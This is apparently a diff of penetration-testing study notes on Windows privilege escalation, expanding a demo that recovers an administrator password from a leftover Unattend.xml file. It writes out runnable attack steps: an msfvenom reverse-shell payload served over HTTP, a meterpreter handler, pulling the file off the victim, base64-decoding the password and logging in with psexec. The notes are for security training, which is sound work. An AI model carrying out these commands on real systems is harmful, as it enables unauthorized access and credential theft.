@@ -591,7 +591,7 @@ Windows Configuration Files (not third party)
 - If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.
 
 Unattended Windows Setup 
-
+- The Unattended Windows Setup utility configuration file, commonly known as the "unattend.xml" file, is an XML-based configuration file used in Windows operating systems to automate the installation process. It allows for unattended installations, meaning that the installation proceeds without requiring user intervention or input.
 - The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
 	- C:\\Windows\\Panther\\Unattend.xml
 	- C:\\Windows\\Panther\\Autounattend.xml
@@ -600,10 +600,10 @@ Unattended Windows Setup
 
 ![[Pasted image 20230707111320.png]]
 
-Demo 
+Demo - find password of administrator within a legitimate windows config file 
 
 1. get access to victim 
-	- generate meterpreter payload: msfvenom -p windows/x64/metrpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe >payload.exe 
+	- generate meterpreter payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe >payload.exe 
 	- python -m SimpleHTTPServer 80 
 		- This command starts a simple HTTP server using Python. The server listens on port 80, which is the default port for HTTP traffic. The reason why Python's built-in HTTP server is used to host the payload (`payload.exe`) is that it provides a convenient and lightweight way to serve the file to potential victims. By hosting the file on a server, an attacker can share the payload's download link and trick users into downloading and executing the malicious file. Once executed, the meterpreter payload establishes a reverse TCP connection back to the attacker's machine, enabling them to gain unauthorized access and control over the victim's system. 
 	- Transfer file to victim system: 
@@ -618,14 +618,24 @@ Demo
 	- set up msfconsole and set up multi/handler 
 		- set payload windows/x64/meterpreter/reverse_tcp, LPORT 1234 LHOST kali ip 
 		- Once you go back to the victim system and you click on the payload a meterpreter session will be started in the multi/handler 
+		- sysinfo 
+		- search -f Unattend.xml    (located: C:\Windows\Panther\Unattend.xml)
+		- cd to C:\\Windows\\Panther\\Unattend.xml
+		- dir 
+		- download unattend.xml 
+		- go into new window outside Metasploit 
+	- in new terminal locate the file that you downloaded from victim
+		- cat unattend.xml
+		- look for user credentials  (autologon)
+		- the password (plaintext is false) is in base64 
+		- we create a new file: vim password.txt 
+			- paste the base64 password, quit 
+		- use base64 package: base64 -d password.txt 
+		- test the password: psexec.py Administrator@targetip 
+			- enter password 
+			- whoami 
 
-
-
-
-
-
-
-
+Administrators often forget to delete these kind of files. Hackers can use these files to attain privileged account by getting the password from Unattended Windows Setup utility configuration file
 
 ### Dumping Hashes With mimikatz 
 
@@ -638,7 +648,7 @@ that stores hashed user passwords.
 - Note: Mimikatz will require elevated privileges in order to run correctly
 
 
-
+Demo 
 
 
 
